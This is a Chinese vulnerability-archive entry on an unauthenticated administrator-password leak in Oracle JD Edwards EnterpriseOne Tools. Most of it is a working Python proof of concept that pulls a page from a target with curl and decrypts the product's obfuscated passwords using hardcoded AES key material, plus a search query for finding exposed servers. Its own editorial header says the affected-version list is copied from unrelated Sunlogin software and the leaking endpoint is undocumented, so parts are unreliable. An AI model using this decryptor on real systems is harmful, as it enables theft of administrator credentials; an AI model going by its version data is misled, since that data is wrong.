---
source: "wy876 漏洞文库"
title: "Oracle JDEdwards EnterpriseOne Tools存在未授权获取管理员密码漏洞"
product: "Oracle JD Edwards EnterpriseOne Tools"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "未给泄漏端点/认证条件；已有密文样例才能解码"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-0d3f8a26375a53833c7dec0e"
entity_id: "ve-0d3f8a26375a53833c7dec0e"
schema_version: "1"
---

# Oracle JDEdwards EnterpriseOne Tools存在未授权获取管理员密码漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：未给泄漏端点/认证条件；已有密文样例才能解码
- 证据范围：完整本地解码函数，但没有实际获取管理员密文的漏洞请求

### 本次正文校订

- 按该篇代码内容修正错误的 Java 语言标记。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- P0影响版本错误复制向日葵个人版/简约版，与Oracle无关
- P0错归Oracle MySQL Server，实际JD Edwards
- 无获取密文端点、响应结构和验证证据；--target直接取整页正文不能证明能自动提取
- ASCII banner可能暗示编号但无明确CVE字段，不能据此猜主CVE
- Python/命令块误标Java
- 需重建版本/根因/补丁来源后保留

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 一、漏洞描述
Oracle JDEdwards EnterpriseOne Tools存在未授权获取管理员密码漏洞

## 二、影响版本
+ 向日葵个人版 for Windows <=11.0.0.33162版本
+ 向日葵简约版 <= V1.0.1.43315（2021.12）

## 三、漏洞测绘
```python
port:8999 product:"Oracle WebLogic Server"
```


## 四、漏洞复现


使用下面解密脚本解密

```python
python3 poc.py --string ACHCJKFKHCJKKKJJIBBOCDPIHOEJIICHDGHGJEBABEAG
```


```python
import base64
import argparse
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def main():
    # Display ASCII art
    print("""
       ______   ______    ___  ___  ___  ___      ___ ________ ____
      / ___/ | / / __/___|_  |/ _ \|_  |/ _ \____|_  /_  /_  /|_  /
     / /__ | |/ / _//___/ __// // / __// // /___/ __/ / //_ <_/_ < 
     \___/ |___/___/   /____/\___/____/\___/   /____//_/____/____/ 
    """)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Decrypt a given string.')
    parser.add_argument('--string', help='The string to be decrypted')
    parser.add_argument('--target', help='The target URL to fetch the string from')
    args = parser.parse_args()

    if args.target:
        # Fetch the response from the target URL
        response = fetch_target_string_with_curl(args.target)
        if response:
            input_str = response
            print(f"Fetched string from target: {input_str}")
        else:
            print("No valid string found in the response.")
            return
    elif args.string:
        input_str = args.string
    else:
        print("You must provide either --string or --target.")
        return

    # Decrypt the string
    array_of_bytes = jde_decipher(input_str.encode("UTF-8"))
    print("Decrypted string:", array_of_bytes.decode("UTF-8"))

def fetch_target_string_with_curl(target_url):
    try:
        # Use curl to fetch the target URL with SSL verification disabled
        result = subprocess.run(['curl', '-k', target_url], capture_output=True, text=True)
        if result.returncode == 0:
            response_text = result.stdout.strip()
            print("Response received:")
            print(response_text)  # Print for debugging
            return response_text
        else:
            print(f"curl failed with return code {result.returncode}")
            return None
    except Exception as e:
        print(f"Failed to fetch from target using curl: {e}")
        return None

def jde_decipher(param_array_of_bytes):
    array_of_bytes_1 = show_buffer(param_array_of_bytes)
    array_of_bytes_2 = base64.b64decode(array_of_bytes_1)
    return array_of_bytes_2

def show_buffer(param_array_of_bytes):
    array_of_bytes_1 = bytearray(len(param_array_of_bytes) // 2)
    for j in range(len(array_of_bytes_1)):
        i = 2 * j
        array_of_bytes_1[j] = ((param_array_of_bytes[i] - 65) << 4) + (param_array_of_bytes[i + 1] - 65)

    if array_of_bytes_1[0] != 2:
        raise Exception("Invalid version for net showBuffer")

    array_of_bytes_2 = bytearray(16)
    array_of_bytes_3 = bytearray(16)
    gen_keys(array_of_bytes_2, array_of_bytes_3, array_of_bytes_1[3])

    cipher = AES.new(array_of_bytes_2, AES.MODE_CBC, iv=array_of_bytes_3)
    array_of_bytes_4 = unpad(cipher.decrypt(bytes(array_of_bytes_1[6:])), AES.block_size)

    return array_of_bytes_4

def gen_keys(param_array_of_bytes_1, param_array_of_bytes_2, param_byte):
    array_of_bytes_1 = bytearray([65, 4, 95, 12, 88, 41, 6, 114, 119, 93, 37, 68, 75, 19, 49, 46])
    array_of_bytes_2 = bytearray([107, 34, 26, 94, 68, 41, 119, 48, 3, 88, 28, 97, 5, 127, 77, 54])
    array_of_bytes_3 = bytearray([36, 89, 113, 109, 38, 15, 7, 66, 76, 115, 16, 53, 106, 94, 27, 56])

    j = param_byte >> 4
    k = param_byte & 0xF
    m = array_of_bytes_3[j]
    for i in range(16):
        param_array_of_bytes_1[i] = array_of_bytes_1[i] ^ m

    m = array_of_bytes_3[k]
    for i in range(16):
        param_array_of_bytes_2[i] = array_of_bytes_2[i] ^ m

if __name__ == "__main__":
    main()
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pmvkhnz91qoo3axw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
